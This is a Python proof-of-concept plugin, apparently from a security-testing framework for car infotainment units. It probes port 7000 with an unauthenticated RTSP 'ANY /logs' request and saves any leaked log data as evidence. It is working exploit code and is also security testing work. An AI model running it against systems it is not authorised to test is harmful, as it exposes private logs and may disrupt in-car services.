"""
PoC Name: RTSP Log Information Leak
Identifier: CWE-200
Component: Network Stack
Category: Network
Severity: High
CVSS: 7.0
Description: RTSP ANY请求检测端口7000未授权日志访问
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python3 11_RTSP_Log_Leak.py <target_ip>
"""
import socket
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

class RTSPLogLeakPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-011"
    """
    RTSP ANY Request Log Leak POC
    检测目标是否允许通过 RTSP ANY 请求未授权访问日志文件。
    实车执行需人工确认（可能影响 CarPlay/RTSP 服务稳定性）。
    """
    meta_poc_name = "RTSP Log Leak"
    meta_cve_id = "CWE-200"
    meta_severity = "High"
    meta_protocol = "rtsp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = True
    meta_destructive_level = "Restart"

    
    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        # 如果你有具体的 CVE 编号，可以在这里修改
        self.results["cve_id"] = "Unknown-RTSP-Log-Leak"
        self.results["description"] = "RTSP ANY Request Log Information Leak"
        self.results["requires_human_review"] = True
        self.target_port = 7000

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需指定目标IP")
            return False
        return True

    def exploit(self):
        self.logger.info(f"正在连接目标 {self.target_ip}:{self.target_port} 进行 RTSP 测试...")
        
        # 构建 RTSP 请求报文
        # 原始逻辑: ANY /logs?id=0 RTSP/1.0
        request_message = (
            f"ANY /logs?id=0 RTSP/1.0\r\n"
            f"Host: {self.target_ip}:{self.target_port}\r\n"
            f"\r\n"
        )
        
        try:
            # 创建 socket 连接
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((self.target_ip, self.target_port))
                self.logger.info("连接成功，正在发送 Payload...")
                
                # 发送报文
                s.sendall(request_message.encode('utf-8'))
                
                # 接收响应
                try:
                    response_bytes = s.recv(4096)
                    response_str = response_bytes.decode('utf-8', errors='ignore').strip()
                    
                    self.logger.debug(f"收到响应内容 (前100字符): {response_str[:100]}...")

                    # 漏洞判断逻辑：
                    # 如果返回 RTSP/1.0 200 OK，或者包含典型的日志特征，则认为存在漏洞
                    if "RTSP/1.0 200 OK" in response_str:
                        self.logger.warning("收到 200 OK 响应，目标可能存在日志泄露漏洞。")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = f"Response Header: {response_str.splitlines()[0]}"
                        # 可选：将部分响应体作为证据保存
                        self.results["raw_response"] = response_str[:500] 
                    elif "401 Unauthorized" in response_str or "403 Forbidden" in response_str:
                        self.logger.info("目标拒绝访问 (401/403)，漏洞不存在。")
                        self.results["vulnerable"] = False
                    else:
                        self.logger.info("收到非预期响应，标记为未确认或无漏洞。")
                        self.results["vulnerable"] = False
                        self.results["evidence"] = f"Unexpected response: {response_str[:50]}"

                except socket.timeout:
                    self.logger.info("读取响应超时，未收到数据。")
                    self.results["vulnerable"] = False

        except ConnectionRefusedError:
            self.logger.error("连接被拒绝，端口未开放。")
            self.results["vulnerable"] = False
        except socket.timeout:
            self.logger.error("连接超时。")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"Exploit execution failed: {e}")
            self.results["vulnerable"] = False
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 11_RTSP_Log_Leak.py <target_ip>")
        sys.exit(1)
    plugin = RTSPLogLeakPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
